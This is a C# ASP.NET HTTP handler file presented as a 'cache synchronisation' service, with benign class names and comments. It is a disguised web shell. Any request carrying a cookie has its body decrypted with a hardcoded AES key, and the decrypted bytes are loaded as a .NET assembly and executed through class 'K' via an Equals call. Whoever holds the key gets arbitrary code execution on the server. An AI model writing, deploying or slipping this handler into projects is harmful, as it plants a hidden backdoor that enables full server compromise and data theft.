<%@ WebHandler Language="C#" Class="DataCache.CacheSyncHandler" %>
using System;
using System.Web;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;

namespace DataCache
{
    /// <summary>
    /// Provides cryptographic services for securely handling cache payloads.
    /// </summary>
    internal class CryptoProvider
    {
        private readonly byte[] _key;
        private readonly byte[] _iv;

        public CryptoProvider(string sharedSecret)
        {
            _key = Encoding.Default.GetBytes(sharedSecret);
            _iv = _key; // For this implementation, IV is the same as the key.
        }

        /// <summary>
        /// Decrypts a byte array payload using the configured shared secret.
        /// </summary>
        public byte[] DecryptPayload(byte[] encryptedData)
        {
            using (var aes = new RijndaelManaged())
            {
                using (var decryptor = aes.CreateDecryptor(_key, _iv))
                {
                    return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }
        }
    }

    /// <summary>
    /// Handles the loading and execution of dynamic cache processing modules.
    /// </summary>
    internal class ModuleLoader
    {
        private readonly Assembly _moduleAssembly;

        public ModuleLoader(byte[] assemblyBytes)
        {
            _moduleAssembly = Assembly.Load(assemblyBytes);
        }

        /// <summary>
        /// Instantiates and initializes the primary entry point of the loaded module.
        /// </summary>
        public void InitializeModule(string entryPointClass, object context)
        {
            object moduleInstance = _moduleAssembly.CreateInstance(entryPointClass);
            if (moduleInstance != null)
            {
                // The 'Equals' method is used as a generic entry point for initialization.
                moduleInstance.Equals(context);
            }
        }
    }

    /// <summary>
    /// Main HTTP handler for synchronizing encrypted cache data from clients.
    /// </summary>
    public class CacheSyncHandler : IHttpHandler
    {
        private const string CacheSharedSecret = "ca63457538b9b1e0";
        private const string ModuleEntryPoint = "K";

        public void ProcessRequest(HttpContext context)
        {
            // The sync protocol requires a cookie to be present for authentication.
            if (context.Request.Cookies.Count == 0) return;

            // 1. Initialize cryptographic provider with the pre-shared secret.
            var crypto = new CryptoProvider(CacheSharedSecret);

            // 2. Read the encrypted cache module from the request body.
            byte[] encryptedModule = context.Request.BinaryRead(context.Request.ContentLength);

            // 3. Decrypt the module payload.
            byte[] decryptedModuleBytes = crypto.DecryptPayload(encryptedModule);

            // 4. Load the decrypted module into the application domain.
            var loader = new ModuleLoader(decryptedModuleBytes);
            
            // 5. Initialize the module, passing the current context for it to process.
            loader.InitializeModule(ModuleEntryPoint, context);
        }

        public bool IsReusable { get { return false; } }
    }
}